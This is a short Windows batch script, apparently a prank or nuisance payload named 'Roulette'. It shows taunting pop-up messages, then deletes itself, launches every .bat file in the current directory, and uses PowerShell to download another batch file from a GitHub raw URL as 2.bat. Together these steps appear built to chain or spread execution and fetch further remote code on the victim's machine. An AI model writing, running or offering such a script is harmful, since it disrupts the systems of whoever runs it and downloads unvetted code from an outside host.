msg %username% /w "I woudn't touch this message"
timeout -1
msg %username% /t 5 /w "I warned you"
del %0
start *.bat
Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Roulette/extra.bat -OutFile .\2.bat
